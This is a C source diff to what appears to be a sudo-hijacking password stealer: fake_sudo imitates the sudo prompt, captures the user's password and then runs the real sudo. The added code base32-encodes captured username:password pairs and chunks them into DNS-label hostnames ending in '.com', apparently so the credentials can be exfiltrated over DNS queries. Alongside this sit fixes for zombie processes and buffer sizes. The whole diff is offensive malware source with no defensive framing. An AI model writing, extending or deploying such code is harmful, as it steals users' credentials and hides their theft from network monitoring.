@@ -3,16 +3,19 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
+#include <sys/wait.h>
 #include <pwd.h>
 #include <termios.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
 #include "../dns/dns.h"
+#include "../encode/encode.h"
+
 /* 
     Don't edit 
 */
-# define BUFFER_LEN 2048
+# define BUFFER_LEN 4096
 # define MAX_RETRY 3
 
 /*
@@ -80,9 +83,10 @@ steal_password(char **lineptr, size_t *n, FILE *stream)
 void
 strrpc(char **str,char *oldstr,char *newstr){
     char bstr[4096];
+    int i;
     memset(bstr,0,sizeof(bstr));
  
-    for(int i = 0;i < strlen(*str);i++){
+    for(i = 0;i < strlen(*str);i++){
         if(!strncmp(*str+i,oldstr,strlen(oldstr))){
             strcat(bstr,newstr);
             i += strlen(oldstr) - 1;
@@ -94,6 +98,58 @@ strrpc(char **str,char *oldstr,char *newstr){
    strcpy(*str,bstr);
 }
 
+int 
+count_equals(char *encoded_string){
+    int i ;
+    int count = 0;
+    int interrupt = 0;
+
+    for (i = 0;i < strlen(encoded_string);i++){
+        if (encoded_string[i] == '='){
+            if (count == 0){
+                interrupt = i;
+            }
+            count ++;
+        }
+    }
+
+    if (count != 0) {
+        encoded_string[interrupt] = '\0';
+    }
+
+    return count;
+}
+
+char *
+modify_result(char *encoded_string){
+    static char modify_string[BUFFER_LEN];
+    char temp[100];
+    int i;
+
+    memset(modify_string, 0, sizeof(modify_string));
+
+    int number = strlen(encoded_string)/63;
+
+    if (number == 0){
+        return encoded_string;
+    } else{
+        for (i=0;i<number;i++){
+            memset(temp, '\0', sizeof(temp));
+            strncpy(temp,encoded_string+63*i*sizeof(char),63);
+            temp[63] = '.';
+            strcat(modify_string,temp);
+        }
+        memset(temp, '\0', sizeof(temp));
+        strncpy(temp,encoded_string+63*i*sizeof(char),strlen(encoded_string)-63*i);
+        strcat(modify_string,temp);
+    }
+
+    if (modify_string[strlen(modify_string)-1] == '.'){
+         modify_string[strlen(modify_string)-1] = '\0';
+    }
+
+    return modify_string;
+}
 
 void 
 save_passwd(char *name,char *password,char *all, int success)
@@ -108,7 +164,19 @@ save_passwd(char *name,char *password,char *all, int success)
 
     char text[BUFFER_LEN] = {0};
 
-    snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 
+
+    if (SAVE_OR_SEND){
+        snprintf(text, sizeof(text), "%s:%s:%s", name, password, status); 
+    } else{
+        char tmp_text[4096];
+        baseencode_error_t err;
+        snprintf(tmp_text, sizeof(tmp_text), "%s:%s", name, password); 
+        char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
+        int count = count_equals(encoded_string);
+        encoded_string = modify_result(encoded_string);
+        snprintf(text, sizeof(text), "%d.%s.com", count,encoded_string); 
+        free(encoded_string);
+    }
 
     strcat(all,text);
 }
@@ -209,12 +277,16 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                 if (retryTimes == MAX_RETRY-1)
                 {
                     printf("sudo: %d incorrect password attempts\n", MAX_RETRY);
-                    save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
+                    if (SAVE_OR_SEND){
+                        save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
+                    }
                     return allPasswd;
                 }
 
                 printf("Sorry, try again.\n");
-                save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
+                if (SAVE_OR_SEND){
+                    save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
+                }
             }
             else
             {
@@ -227,6 +299,7 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                } 
                else
                {
+                   wait(NULL); // 防止用户执行的是无限循环服务，从而产生僵尸进程
                    execv("/usr/bin/sudo",params);
                    exit(0);
                }
@@ -285,6 +358,7 @@ hijack_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                 else
                 {
                     clear_all();
+                    exit(0);
                 }
             }
         }
